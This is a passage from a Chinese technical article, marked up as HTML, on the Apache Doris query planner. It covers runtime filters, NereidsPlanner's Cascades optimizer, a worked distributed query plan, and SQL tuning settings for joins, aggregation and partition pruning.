     * 单个 Fragment 实例的执行参数
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FInstanceExecParam</span> {
        <span class="hljs-keyword">public</span> TUniqueId instanceId;      <span class="hljs-comment">// 实例 ID</span>
        <span class="hljs-keyword">public</span> TNetworkAddress host;      <span class="hljs-comment">// 执行节点</span>
        
        <span class="hljs-comment">// ScanNode 的扫描范围</span>
        <span class="hljs-keyword">public</span> Map&lt;Integer, List&lt;TScanRangeParams&gt;&gt; perNodeScanRanges;
        
        <span class="hljs-comment">// 接收数据的节点（用于 DataStreamSink）</span>
        <span class="hljs-keyword">public</span> List&lt;TNetworkAddress&gt; destinations;
    }
}
</code></pre>
<p><strong>执行实例分配示例</strong>：</p>
<p>假设有 3 个 BE 节点（BE1、BE2、BE3），扫描的表有 6 个 Tablet：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">Fragment</span> <span class="hljs-number">0</span> <span class="hljs-string">(OLAP_SCAN)</span>
  <span class="hljs-string">├──</span> <span class="hljs-string">Instance</span> <span class="hljs-number">0</span> <span class="hljs-string">@</span> <span class="hljs-attr">BE1:</span> <span class="hljs-string">Scan</span> <span class="hljs-string">Tablet[0,</span> <span class="hljs-number">3</span><span class="hljs-string">]</span>
  <span class="hljs-string">├──</span> <span class="hljs-string">Instance</span> <span class="hljs-number">1</span> <span class="hljs-string">@</span> <span class="hljs-attr">BE2:</span> <span class="hljs-string">Scan</span> <span class="hljs-string">Tablet[1,</span> <span class="hljs-number">4</span><span class="hljs-string">]</span>
  <span class="hljs-string">└──</span> <span class="hljs-string">Instance</span> <span class="hljs-number">2</span> <span class="hljs-string">@</span> <span class="hljs-attr">BE3:</span> <span class="hljs-string">Scan</span> <span class="hljs-string">Tablet[2,</span> <span class="hljs-number">5</span><span class="hljs-string">]</span>

<span class="hljs-string">Fragment</span> <span class="hljs-number">1</span> <span class="hljs-string">(AGGREGATE)</span>
  <span class="hljs-string">├──</span> <span class="hljs-string">Instance</span> <span class="hljs-number">0</span> <span class="hljs-string">@</span> <span class="hljs-attr">BE1:</span> <span class="hljs-string">Receive</span> <span class="hljs-string">from</span> <span class="hljs-string">Fragment</span> <span class="hljs-number">0</span>
  <span class="hljs-string">├──</span> <span class="hljs-string">Instance</span> <span class="hljs-number">1</span> <span class="hljs-string">@</span> <span class="hljs-attr">BE2:</span> <span class="hljs-string">Receive</span> <span class="hljs-string">from</span> <span class="hljs-string">Fragment</span> <span class="hljs-number">0</span>
  <span class="hljs-string">└──</span> <span class="hljs-string">Instance</span> <span class="hljs-number">2</span> <span class="hljs-string">@</span> <span class="hljs-attr">BE3:</span> <span class="hljs-string">Receive</span> <span class="hljs-string">from</span> <span class="hljs-string">Fragment</span> <span class="hljs-number">0</span>
</code></pre>
<hr/>
<h2 data-id="heading-21">5. Runtime Filter 运行时过滤（How）</h2>
<h3 data-id="heading-22">5.1 Runtime Filter 原理</h3>
<p><strong>问题</strong>：Join 操作中，如果能提前知道右表的过滤条件，可以在扫描左表时就过滤掉不匹配的数据。</p>
<p><strong>解决方案</strong>：在右表构建 Hash Table 时生成 Bloom Filter 或 MinMax Filter，下推到左表扫描。</p>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> large_table l
<span class="hljs-keyword">JOIN</span> small_table s <span class="hljs-keyword">ON</span> l.id <span class="hljs-operator">=</span> s.id
<span class="hljs-keyword">WHERE</span> s.category <span class="hljs-operator">=</span> <span class="hljs-string">'electronics'</span>;
</code></pre>
<p><strong>执行流程</strong>：</p>
<ol>
<li>
<p><strong>Build 阶段</strong>：扫描 small_table（右表）</p>
<ul>
<li>过滤 <code>category = 'electronics'</code></li>
<li>提取所有 <code>s.id</code> 构建 Bloom Filter</li>
<li><strong>生成 Runtime Filter</strong></li>
</ul>
</li>
<li>
<p><strong>Probe 阶段</strong>：扫描 large_table（左表）</p>
<ul>
<li><strong>应用 Runtime Filter</strong>：只扫描 <code>l.id IN (Bloom Filter)</code> 的数据</li>
<li>减少扫描数据量和 Join 计算量</li>
</ul>
</li>
<li>
<p><strong>Join 执行</strong>：</p>
<ul>
<li>左表数据已被过滤，Join 速度更快</li>
</ul>
</li>
</ol>
<h3 data-id="heading-23">5.2 Runtime Filter 实现</h3>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/planner/RuntimeFilter.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RuntimeFilter</span> {
    <span class="hljs-keyword">private</span> RuntimeFilterId id;
    
    <span class="hljs-comment">// Filter 类型</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">RuntimeFilterType</span> {
        IN_FILTER,           <span class="hljs-comment">// IN 列表过滤</span>
        BLOOM_FILTER,        <span class="hljs-comment">// Bloom Filter</span>
        MIN_MAX_FILTER,      <span class="hljs-comment">// MinMax 范围过滤</span>
        IN_OR_BLOOM_FILTER   <span class="hljs-comment">// IN + Bloom 组合</span>
    }
    
    <span class="hljs-comment">// Build 端（生成 Filter 的节点）</span>
    <span class="hljs-keyword">private</span> PlanNodeId builderNodeId;
    
    <span class="hljs-comment">// Target 端（应用 Filter 的节点列表）</span>
    <span class="hljs-keyword">private</span> List&lt;PlanNodeId&gt; targetNodeIds;
    
    <span class="hljs-comment">// Join 条件表达式</span>
    <span class="hljs-keyword">private</span> Expr srcExpr;      <span class="hljs-comment">// Build 端表达式（如 s.id）</span>
    <span class="hljs-keyword">private</span> List&lt;Expr&gt; targetExprs;  <span class="hljs-comment">// Target 端表达式（如 l.id）</span>
    
    <span class="hljs-comment">// Filter 大小和选择性</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> filterSizeBytes;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> selectivity;
}
</code></pre>
<p><strong>Runtime Filter 生成时机</strong>：</p>
<p>在 HashJoinNode 初始化时，Planner 会分析：</p>
<ol>
<li>Join 条件是否为等值连接</li>
<li>右表（Build 端）是否足够小</li>
<li>左表（Probe 端）是否为 ScanNode</li>
</ol>
<p>如果满足条件，生成 Runtime Filter 并：</p>
<ul>
<li>在右表 ScanNode 添加 <code>builderRuntimeFilter</code></li>
<li>在左表 ScanNode 添加 <code>targetRuntimeFilter</code></li>
</ul>
<h3 data-id="heading-24">5.3 Runtime Filter 下推</h3>
<p><strong>下推到存储层</strong>：</p>
<p>Runtime Filter 可以下推到 BE 的存储引擎：</p>
<ul>
<li><strong>Bloom Filter</strong>：在读取 Segment 时过滤</li>
<li><strong>MinMax Filter</strong>：利用列统计信息（ZoneMap）裁剪数据块</li>
</ul>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">OLAP_SCAN</span> (large_table)
  ├── <span class="hljs-selector-tag">conjuncts</span>: <span class="hljs-selector-attr">[l.category = <span class="hljs-string">'active'</span>]</span>
  └── <span class="hljs-selector-tag">runtime_filters</span>: <span class="hljs-selector-attr">[l.id IN BloomFilter(s.id)]</span>
      ↓ (下推到 BE)
      <span class="hljs-selector-tag">Segment</span> 读取时应用 <span class="hljs-selector-tag">Bloom</span> <span class="hljs-selector-tag">Filter</span>
</code></pre>
<hr/>
<h2 data-id="heading-25">6. Nereids Planner vs 传统 Planner（对比）</h2>
<h3 data-id="heading-26">6.1 NereidsPlanner 架构</h3>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/nereids/NereidsPlanner.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NereidsPlanner</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Planner</span> {
    <span class="hljs-keyword">protected</span> Plan parsedPlan;       <span class="hljs-comment">// 解析后的逻辑计划</span>
    <span class="hljs-keyword">protected</span> Plan analyzedPlan;     <span class="hljs-comment">// 分析后的逻辑计划</span>
    <span class="hljs-keyword">protected</span> Plan rewrittenPlan;    <span class="hljs-comment">// 重写后的逻辑计划</span>
    <span class="hljs-keyword">protected</span> Plan optimizedPlan;    <span class="hljs-comment">// 优化后的逻辑计划</span>
    <span class="hljs-keyword">protected</span> PhysicalPlan physicalPlan;  <span class="hljs-comment">// 物理计划</span>
    
    <span class="hljs-keyword">private</span> CascadesContext cascadesContext;  <span class="hljs-comment">// Cascades 优化框架</span>
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">plan</span><span class="hljs-params">(StatementBase queryStmt, TQueryOptions queryOptions)</span> 
            <span class="hljs-keyword">throws</span> UserException {
        <span class="hljs-type">LogicalPlan</span> <span class="hljs-variable">parsedPlan</span> <span class="hljs-operator">=</span> logicalPlanAdapter.getLogicalPlan();
        
        <span class="hljs-comment">// 1. 预处理（Hint 处理等）</span>
        plan = preprocess(plan);
        
        <span class="hljs-comment">// 2. 分析（类型推导、名称解析）</span>
        analyze(showAnalyzeProcess);
        
        <span class="hljs-comment">// 3. 重写（规则优化）</span>
        rewrite(showRewriteProcess);
        
        <span class="hljs-comment">// 4. CBO 优化（代价优化）</span>
        optimize(showPlanProcess);
        
        <span class="hljs-comment">// 5. 选择最优物理计划</span>
        <span class="hljs-type">PhysicalPlan</span> <span class="hljs-variable">physicalPlan</span> <span class="hljs-operator">=</span> chooseNthPlan(
            getRoot(), requireProperties, nth);
        
        <span class="hljs-comment">// 6. 后处理（Runtime Filter 生成等）</span>
        physicalPlan = postProcess(physicalPlan);
        
        <span class="hljs-comment">// 7. 分布式计划生成</span>
        distribute(physicalPlan, explainLevel);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">optimize</span><span class="hljs-params">(<span class="hljs-type">boolean</span> showPlanProcess)</span> {
        <span class="hljs-comment">// Cascades 优化器</span>
        <span class="hljs-type">Optimizer</span> <span class="hljs-variable">optimizer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Optimizer</span>(cascadesContext);
        optimizer.optimize();
    }
}
</code></pre>
<h3 data-id="heading-27">6.2 Nereids vs 传统 Planner 对比</h3>























































<table><thead><tr><th>对比维度</th><th>传统 Planner</th><th>NereidsPlanner</th></tr></thead><tbody><tr><td><strong>优化框架</strong></td><td>基于规则的优化（RBO）</td><td>Cascades 框架（CBO）</td></tr><tr><td><strong>代价模型</strong></td><td>简单启发式</td><td>完善的代价模型 + 统计信息</td></tr><tr><td><strong>逻辑计划表示</strong></td><td>AST（StatementBase）</td><td>Plan 树（LogicalPlan）</td></tr><tr><td><strong>物理计划生成</strong></td><td>直接转换</td><td>通过 Memo 搜索最优计划</td></tr><tr><td><strong>Join 顺序优化</strong></td><td>左深树 + 简单调整</td><td>动态规划 + Bushy Tree</td></tr><tr><td><strong>表达式优化</strong></td><td>有限的常量折叠</td><td>完整的表达式重写框架</td></tr><tr><td><strong>子查询处理</strong></td><td>部分 Unnesting</td><td>完整的 Decorrelation</td></tr><tr><td><strong>优化规则</strong></td><td>约 50 个硬编码规则</td><td>300+ 模式匹配规则</td></tr><tr><td><strong>扩展性</strong></td><td>新增规则需修改多处代码</td><td>声明式规则，易于扩展</td></tr></tbody></table>
<h3 data-id="heading-28">6.3 Nereids 优化阶段</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[LogicalPlan] --&gt; B[Analyze分析]
    B --&gt; C[Rewrite重写]
    C --&gt; D[Optimize优化]
    D --&gt; E[PhysicalPlan]
    
    B --&gt; B1[类型推导]
    B --&gt; B2[名称解析]
    B --&gt; B3[子查询Unnesting]
    
    C --&gt; C1[谓词下推]
    C --&gt; C2[列裁剪]
    C --&gt; C3[常量折叠]
    C --&gt; C4[公共表达式消除]
    
    D --&gt; D1[Join顺序优化]
    D --&gt; D2[聚合下推]
    D --&gt; D3[物理算子选择]
    D --&gt; D4[Runtime Filter生成]
</code></pre>
<p><strong>Cascades 框架核心概念</strong>：</p>
<ol>
<li>
<p><strong>Memo</strong>：</p>
<ul>
<li>紧凑存储所有等价表达式</li>
<li>Group：逻辑等价的表达式集合</li>
<li>GroupExpression：具体的表达式实现</li>
</ul>
</li>
<li>
<p><strong>Search Space</strong>：</p>
<ul>
<li>通过规则不断扩展 Memo</li>
<li>生成多种等价的逻辑/物理计划</li>
</ul>
</li>
<li>
<p><strong>Cost-Based Selection</strong>：</p>
<ul>
<li>为每个物理计划估算代价</li>
<li>选择代价最小的计划</li>
</ul>
</li>
</ol>
<p><strong>示例</strong>：Join 顺序优化</p>
<p>传统 Planner：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> A, B, C <span class="hljs-keyword">WHERE</span> A.id <span class="hljs-operator">=</span> B.id <span class="hljs-keyword">AND</span> B.id <span class="hljs-operator">=</span> C.id;
<span class="hljs-comment">-- 固定生成: (A JOIN B) JOIN C</span>
</code></pre>
<p>NereidsPlanner：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 搜索空间包含:</span>
<span class="hljs-comment">-- Option 1: (A JOIN B) JOIN C</span>
<span class="hljs-comment">-- Option 2: (A JOIN C) JOIN B</span>
<span class="hljs-comment">-- Option 3: (B JOIN C) JOIN A</span>
<span class="hljs-comment">-- 根据统计信息和代价模型选择最优</span>
</code></pre>
<hr/>
<h2 data-id="heading-29">7. 查询规划示例</h2>
<h3 data-id="heading-30">7.1 示例查询</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> 
    o.order_date,
    c.customer_name,
    <span class="hljs-built_in">SUM</span>(o.amount) <span class="hljs-keyword">as</span> total_amount
<span class="hljs-keyword">FROM</span> orders o
<span class="hljs-keyword">JOIN</span> customers c <span class="hljs-keyword">ON</span> o.customer_id <span class="hljs-operator">=</span> c.id
<span class="hljs-keyword">WHERE</span> o.order_date <span class="hljs-operator">&gt;=</span> <span class="hljs-string">'2024-01-01'</span>
  <span class="hljs-keyword">AND</span> c.region <span class="hljs-operator">=</span> <span class="hljs-string">'ASIA'</span>
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> o.order_date, c.customer_name
<span class="hljs-keyword">HAVING</span> <span class="hljs-built_in">SUM</span>(o.amount) <span class="hljs-operator">&gt;</span> <span class="hljs-number">1000</span>
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> total_amount <span class="hljs-keyword">DESC</span>
LIMIT <span class="hljs-number">100</span>;
</code></pre>
<h3 data-id="heading-31">7.2 生成的 PlanNode 树</h3>
<pre><code class="hljs language-sql" lang="sql">┌─ <span class="hljs-keyword">RESULT</span> SINK
│
└─ TOP<span class="hljs-operator">-</span>N [LIMIT <span class="hljs-number">100</span>, <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> total_amount <span class="hljs-keyword">DESC</span>]
   │
   └─ VAGGREGATE (<span class="hljs-keyword">merge</span> finalize)
      │   output: <span class="hljs-built_in">SUM</span>(sum_amount)
      │   <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>: order_date, customer_name
      │   <span class="hljs-keyword">having</span>: <span class="hljs-built_in">SUM</span>(sum_amount) <span class="hljs-operator">&gt;</span> <span class="hljs-number">1000</span>
      │
      └─ EXCHANGE [HASH_PARTITIONED: order_date, customer_name]
         │
         └─ VAGGREGATE (<span class="hljs-keyword">update</span> serialize)
            │   output: <span class="hljs-built_in">SUM</span>(amount) <span class="hljs-keyword">as</span> sum_amount
            │   <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>: order_date, customer_name
            │
            └─ HASH <span class="hljs-keyword">JOIN</span> [<span class="hljs-keyword">INNER</span> <span class="hljs-keyword">JOIN</span>]
               │   <span class="hljs-keyword">join</span> <span class="hljs-keyword">condition</span>: o.customer_id <span class="hljs-operator">=</span> c.id
               │   distribution: BROADCAST
               │
               ├─ OLAP_SCAN (orders)
               │   predicates: order_date <span class="hljs-operator">&gt;=</span> <span class="hljs-string">'2024-01-01'</span>
               │   runtime_filters: customer_id <span class="hljs-keyword">IN</span> BloomFilter
               │
               └─ EXCHANGE [BROADCAST]
                  │
                  └─ OLAP_SCAN (customers)
                      predicates: region <span class="hljs-operator">=</span> <span class="hljs-string">'ASIA'</span>
</code></pre>
<h3 data-id="heading-32">7.3 Fragment 分解</h3>
<p><strong>Fragment 0</strong>：扫描 customers 表（右表）</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">PlanRoot:</span> <span class="hljs-string">OLAP_SCAN</span> <span class="hljs-string">(customers)</span>
  <span class="hljs-attr">predicates:</span> <span class="hljs-string">region</span> <span class="hljs-string">=</span> <span class="hljs-string">'ASIA'</span>
  
<span class="hljs-attr">DataSink:</span> <span class="hljs-string">DataStreamSink</span> <span class="hljs-string">(BROADCAST</span> <span class="hljs-string">to</span> <span class="hljs-string">Fragment</span> <span class="hljs-number">2</span><span class="hljs-string">)</span>

<span class="hljs-attr">Instances:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">Instance</span> <span class="hljs-number">0</span> <span class="hljs-string">@</span> <span class="hljs-attr">BE1:</span> <span class="hljs-string">Scan</span> <span class="hljs-string">Tablet[0,3,6]</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">Instance</span> <span class="hljs-number">1</span> <span class="hljs-string">@</span> <span class="hljs-attr">BE2:</span> <span class="hljs-string">Scan</span> <span class="hljs-string">Tablet[1,4,7]</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">Instance</span> <span class="hljs-number">2</span> <span class="hljs-string">@</span> <span class="hljs-attr">BE3:</span> <span class="hljs-string">Scan</span> <span class="hljs-string">Tablet[2,5,8]</span>
</code></pre>
<p><strong>Fragment 1</strong>：Result 输出</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">PlanRoot:</span> TOP-N [LIMIT <span class="hljs-number">100</span>]
  ├─ VAGGREGATE (merge finalize)
  └─ EXCHANGE (<span class="hljs-keyword">from</span> Fragment <span class="hljs-number">2</span>)

<span class="hljs-symbol">DataSink:</span> ResultSink (返回给客户端)

<span class="hljs-symbol">Instances:</span>
  - Instance <span class="hljs-number">0</span> @ FE Coordinator (单实例汇总)
</code></pre>
<p><strong>Fragment 2</strong>：扫描 orders 表 + Join + 预聚合</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">PlanRoot:</span> VAGGREGATE (update serialize)
  └─ HASH <span class="hljs-keyword">JOIN</span>
     ├─ OLAP_SCAN (orders)
     │   predicates: order_date &gt;= <span class="hljs-comment">'2024-01-01'</span>
     │   runtime_filters: customer_id <span class="hljs-keyword">IN</span> BloomFilter
     └─ EXCHANGE (<span class="hljs-keyword">from</span> Fragment <span class="hljs-number">0</span>, BROADCAST)

<span class="hljs-symbol">DataSink:</span> DataStreamSink (HASH_PARTITIONED <span class="hljs-keyword">to</span> Fragment <span class="hljs-number">1</span>)

<span class="hljs-symbol">Instances:</span>
  - Instance <span class="hljs-number">0</span> @ BE1: Scan orders Tablet[<span class="hljs-number">0</span>,<span class="hljs-number">3</span>], <span class="hljs-keyword">Join</span>, Agg
  - Instance <span class="hljs-number">1</span> @ BE2: Scan orders Tablet[<span class="hljs-number">1</span>,<span class="hljs-number">4</span>], <span class="hljs-keyword">Join</span>, Agg
  - Instance <span class="hljs-number">2</span> @ BE3: Scan orders Tablet[<span class="hljs-number">2</span>,<span class="hljs-number">5</span>], <span class="hljs-keyword">Join</span>, Agg
</code></pre>
<h3 data-id="heading-33">7.4 执行流程图</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant FE as FE Coordinator
    participant BE1 as BE1
    participant BE2 as BE2
    participant BE3 as BE3
    
    FE-&gt;&gt;BE1: Execute Fragment 0 Instance 0
    FE-&gt;&gt;BE2: Execute Fragment 0 Instance 1
    FE-&gt;&gt;BE3: Execute Fragment 0 Instance 2
    
    Note over BE1,BE3: 扫描 customers 表
    BE1--&gt;&gt;BE1: Scan customers, filter region='ASIA'
    BE2--&gt;&gt;BE2: Scan customers, filter region='ASIA'
    BE3--&gt;&gt;BE3: Scan customers, filter region='ASIA'
    
    BE1-&gt;&gt;BE1: Build Bloom Filter on customer_id
    BE2-&gt;&gt;BE2: Build Bloom Filter on customer_id
    BE3-&gt;&gt;BE3: Build Bloom Filter on customer_id
    
    BE1-&gt;&gt;FE: Publish Runtime Filter
    
    FE-&gt;&gt;BE1: Execute Fragment 2 Instance 0 (with RF)
    FE-&gt;&gt;BE2: Execute Fragment 2 Instance 1 (with RF)
    FE-&gt;&gt;BE3: Execute Fragment 2 Instance 2 (with RF)
    
    Note over BE1,BE3: 扫描 orders 表 (应用 Runtime Filter)
    BE1--&gt;&gt;BE1: Scan orders + Apply Bloom Filter
    BE2--&gt;&gt;BE2: Scan orders + Apply Bloom Filter
    BE3--&gt;&gt;BE3: Scan orders + Apply Bloom Filter
    
    Note over BE1,BE3: Broadcast Join (接收 customers 数据)
    BE1-&gt;&gt;BE1: Receive customers from all BEs
    BE2-&gt;&gt;BE2: Receive customers from all BEs
    BE3-&gt;&gt;BE3: Receive customers from all BEs
    
    BE1--&gt;&gt;BE1: Hash Join + Pre-Agg
    BE2--&gt;&gt;BE2: Hash Join + Pre-Agg
    BE3--&gt;&gt;BE3: Hash Join + Pre-Agg
    
    FE-&gt;&gt;FE: Execute Fragment 1 Instance 0
    
    BE1-&gt;&gt;FE: Send aggregated data (Hash Partitioned)
    BE2-&gt;&gt;FE: Send aggregated data (Hash Partitioned)
    BE3-&gt;&gt;FE: Send aggregated data (Hash Partitioned)
    
    FE--&gt;&gt;FE: Merge Aggregation + TOP-N + LIMIT
    
    FE--&gt;&gt;Client: Return Result
</code></pre>
<h3 data-id="heading-34">7.5 性能优化点</h3>
<ol>
<li>
<p><strong>Runtime Filter</strong>：</p>
<ul>
<li>customers 表过滤后生成 Bloom Filter</li>
<li>下推到 orders 扫描，减少数据量约 80%</li>
</ul>
</li>
<li>
<p><strong>Broadcast Join</strong>：</p>
<ul>
<li>customers 表过滤后很小（假设 1000 行）</li>
<li>广播比 Shuffle 两表更高效</li>
</ul>
</li>
<li>
<p><strong>两阶段聚合</strong>：</p>
<ul>
<li>Fragment 2：本地预聚合（减少网络传输）</li>
<li>Fragment 1：最终聚合（单节点汇总）</li>
</ul>
</li>
<li>
<p><strong>谓词下推</strong>：</p>
<ul>
<li><code>order_date &gt;= '2024-01-01'</code> 下推到存储层</li>
<li><code>region = 'ASIA'</code> 下推到存储层</li>
</ul>
</li>
<li>
<p><strong>列裁剪</strong>：</p>
<ul>
<li>orders 表只读取：customer_id, order_date, amount</li>
<li>customers 表只读取：id, customer_name, region</li>
</ul>
</li>
</ol>
<hr/>
<h2 data-id="heading-35">8. 总结与最佳实践</h2>
<h3 data-id="heading-36">8.1 本章核心要点</h3>
<ol>
<li>
<p><strong>Planner 架构</strong>：</p>
<ul>
<li>抽象基类 Planner 定义统一接口</li>
<li>NereidsPlanner 基于 Cascades 框架实现 CBO</li>
<li>查询计划分为逻辑计划和物理计划</li>
</ul>
</li>
<li>
<p><strong>PlanNode 树</strong>：</p>
<ul>
<li>PlanNode 是查询计划的基本单元</li>
<li>核心节点：ScanNode、JoinNode、AggregationNode</li>
<li>通过 conjuncts 和 RuntimeFilter 优化查询</li>
</ul>
</li>
<li>
<p><strong>PlanFragment</strong>：</p>
<ul>
<li>查询计划被分解为多个可并行执行的 Fragment</li>
<li>通过 ExchangeNode 连接不同 Fragment</li>
<li>Coordinator 负责调度 Fragment 到 BE 执行</li>
</ul>
</li>
<li>
<p><strong>分布式策略</strong>：</p>
<ul>
<li>Join 分布式：Broadcast、Shuffle、Colocate</li>
<li>Aggregation 分阶段：本地预聚合 + 全局聚合</li>
<li>Runtime Filter：动态过滤器优化 Join 性能</li>
</ul>
</li>
<li>
<p><strong>NereidsPlanner</strong>：</p>
<ul>
<li>基于 Cascades 的 CBO 优化器</li>
<li>完善的代价模型和统计信息</li>
<li>模式匹配规则，易于扩展</li>
</ul>
</li>
</ol>
<h3 data-id="heading-37">8.2 Planner 调优建议</h3>
<h4 data-id="heading-38">8.2.1 Join 优化</h4>
<p><strong>选择合适的 Join 分布式策略</strong>：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 大表 JOIN 小表：使用 Broadcast</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-comment">/*+ SET_VAR(broadcast_row_limit=10000000) */</span> <span class="hljs-operator">*</span>
<span class="hljs-keyword">FROM</span> large_table l
<span class="hljs-keyword">JOIN</span> small_table s <span class="hljs-keyword">ON</span> l.id <span class="hljs-operator">=</span> s.id;

<span class="hljs-comment">-- 大表 JOIN 大表：使用 Shuffle</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> table1 t1
<span class="hljs-keyword">JOIN</span> table2 t2 <span class="hljs-keyword">ON</span> t1.key <span class="hljs-operator">=</span> t2.key;

<span class="hljs-comment">-- Colocate Join：建表时设置</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> table1 (...)
DISTRIBUTED <span class="hljs-keyword">BY</span> HASH(key) BUCKETS <span class="hljs-number">32</span>
PROPERTIES("colocate_with" <span class="hljs-operator">=</span> "group1");

<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> table2 (...)
DISTRIBUTED <span class="hljs-keyword">BY</span> HASH(key) BUCKETS <span class="hljs-number">32</span>
PROPERTIES("colocate_with" <span class="hljs-operator">=</span> "group1");
</code></pre>
<h4 data-id="heading-39">8.2.2 聚合优化</h4>
<p><strong>利用流式预聚合</strong>：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 适合流式预聚合（GROUP BY 基数适中）</span>
<span class="hljs-keyword">SELECT</span> region, <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>)
<span class="hljs-keyword">FROM</span> orders
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> region;  <span class="hljs-comment">-- region 只有 10 个值</span>

<span class="hljs-comment">-- 不适合流式预聚合（GROUP BY 基数极高）</span>
<span class="hljs-keyword">SELECT</span> user_id, <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>)
<span class="hljs-keyword">FROM</span> events
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id;  <span class="hljs-comment">-- user_id 有 1 亿个值</span>
</code></pre>
<p><strong>手动设置</strong>：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SET</span> enable_streaming_preaggregation <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">-- 禁用流式预聚合</span>
</code></pre>
<h4 data-id="heading-40">8.2.3 Runtime Filter 调优</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 增加 Runtime Filter 等待时间（适用于大表 Join）</span>
<span class="hljs-keyword">SET</span> runtime_filter_wait_time_ms <span class="hljs-operator">=</span> <span class="hljs-number">10000</span>;

<span class="hljs-comment">-- 调整 Bloom Filter 大小</span>
<span class="hljs-keyword">SET</span> runtime_bloom_filter_size <span class="hljs-operator">=</span> <span class="hljs-number">16777216</span>;  <span class="hljs-comment">-- 16MB</span>

<span class="hljs-comment">-- 设置 Runtime Filter 类型</span>
<span class="hljs-keyword">SET</span> runtime_filter_type <span class="hljs-operator">=</span> "BLOOM_FILTER,MIN_MAX";
</code></pre>
<h4 data-id="heading-41">8.2.4 分区裁剪</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 创建分区表</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> orders (
    order_id <span class="hljs-type">BIGINT</span>,
    order_date <span class="hljs-type">DATE</span>,
    amount <span class="hljs-type">DECIMAL</span>(<span class="hljs-number">10</span>,<span class="hljs-number">2</span>)
)
<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">RANGE</span>(order_date) (
    <span class="hljs-keyword">PARTITION</span> p202401 <span class="hljs-keyword">VALUES</span> LESS THAN ("2024-02-01"),
    <span class="hljs-keyword">PARTITION</span> p202402 <span class="hljs-keyword">VALUES</span> LESS THAN ("2024-03-01"),
    ...
);

<span class="hljs-comment">-- 查询时利用分区裁剪</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> orders
<span class="hljs-keyword">WHERE</span> order_date <span class="hljs-operator">&gt;=</span> <span class="hljs-string">'2024-02-01'</span> 
  <span class="hljs-keyword">AND</span> order_date <span class="hljs-operator">&lt;</span> <span class="hljs-string">'2024-03-01'</span>;
<span class="hljs-comment">-- 只扫描 p202402 分区</span>
